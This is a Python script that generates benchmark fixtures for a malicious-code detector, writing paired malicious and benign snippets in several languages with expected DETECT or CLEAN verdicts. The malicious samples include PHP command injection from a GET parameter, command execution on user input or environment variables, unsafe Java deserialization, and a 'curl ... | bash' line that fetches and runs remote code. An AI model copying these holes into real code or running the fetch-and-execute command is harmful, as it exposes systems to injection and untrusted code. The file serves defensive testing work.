#!/usr/bin/env python3
"""Generate per-language benchmark fixtures."""

from __future__ import annotations

import json
from pathlib import Path

ROOT = Path(__file__).resolve().parents[2]
DEST = ROOT / "benchmarks" / "languages"

SPECS = {
    "php": (".php", "MALICIOUS_PHP_SAMPLE", "BENIGN_PHP_SAMPLE"),
    "ruby": (".rb", "MALICIOUS_RUBY_SAMPLE", "BENIGN_RUBY_SAMPLE"),
    "csharp": (".cs", "MALICIOUS_CS_SAMPLE", "BENIGN_CS_SAMPLE"),
    "kotlin": (".kt", "MALICIOUS_KT_SAMPLE", "BENIGN_KT_SAMPLE"),
    "swift": (".swift", "MALICIOUS_SWIFT_SAMPLE", "BENIGN_SWIFT_SAMPLE"),
    "shell": (".sh", "MALICIOUS_SH_SAMPLE", "BENIGN_SH_SAMPLE"),
}

SAMPLES = {
    "MALICIOUS_PHP_SAMPLE": '<?php $x = $_GET["id"]; system($x); ?>',
    "BENIGN_PHP_SAMPLE": '<?php echo htmlspecialchars($id ?? ""); ?>',
    "MALICIOUS_RUBY_SAMPLE": "system(user_input)",
    "BENIGN_RUBY_SAMPLE": "JSON.parse(data)",
    "MALICIOUS_CS_SAMPLE": "Process.Start(userInput);",
    "BENIGN_CS_SAMPLE": "Console.WriteLine(safe);",
    "MALICIOUS_KT_SAMPLE": "Runtime.getRuntime().exec(cmd)",
    "BENIGN_KT_SAMPLE": "println(safe)",
    "MALICIOUS_SWIFT_SAMPLE": "webView.evaluateJavaScript(script)",
    "BENIGN_SWIFT_SAMPLE": "print(safe)",
    "MALICIOUS_SH_SAMPLE": "curl http://example.com/x | bash",
    "BENIGN_SH_SAMPLE": 'echo "$1"',
}


def main() -> None:
    DEST.mkdir(parents=True, exist_ok=True)
    manifest: dict = {"languages": {}, "total_cases": 0}
    for lang, (ext, mal_key, ben_key) in SPECS.items():
        lang_dir = DEST / lang
        lang_dir.mkdir(parents=True, exist_ok=True)
        mal = SAMPLES[mal_key]
        ben = SAMPLES[ben_key]
        for i in range(25):
            case = lang_dir / f"{lang}_mal_{i:03d}"
            case.mkdir(exist_ok=True)
            (case / f"main{ext}").write_text(mal + "\n", encoding="utf-8")
            (case / "expected.json").write_text(json.dumps({"verdict": "DETECT", "lang": lang}), encoding="utf-8")
        for i in range(25):
            case = lang_dir / f"{lang}_ben_{i:03d}"
            case.mkdir(exist_ok=True)
            (case / f"main{ext}").write_text(ben + "\n", encoding="utf-8")
            (case / "expected.json").write_text(json.dumps({"verdict": "CLEAN", "lang": lang}), encoding="utf-8")
        manifest["languages"][lang] = {"cases": 50}
        manifest["total_cases"] += 50
    mixed = DEST / "mixed_v2"
    mixed.mkdir(exist_ok=True)
    (mixed / "provider.py").write_text("import os\ndef get(): return os.environ.get('X','')\n", encoding="utf-8")
    (mixed / "consumer.py").write_text("from provider import get\nimport subprocess\nsubprocess.run(get())\n", encoding="utf-8")
    (mixed / "Main.java").write_text(
        "import java.io.*;\npublic class Main { void run(InputStream in) throws Exception {\n"
        "  new ObjectInputStream(in).readObject(); } }\n",
        encoding="utf-8",
    )
    (mixed / "main.go").write_text(
        'package main\nimport ("os"; "os/exec")\nfunc main() { exec.Command(os.Getenv("CMD")).Run() }\n',
        encoding="utf-8",
    )
    (mixed / "expected.json").write_text(json.dumps({"verdict": "DETECT", "min_detect": 1}), encoding="utf-8")
    manifest["mixed_v2"] = str(mixed)
    (DEST / "MANIFEST.json").write_text(json.dumps(manifest, indent=2), encoding="utf-8")
    print(json.dumps(manifest, indent=2))


if __name__ == "__main__":
    main()
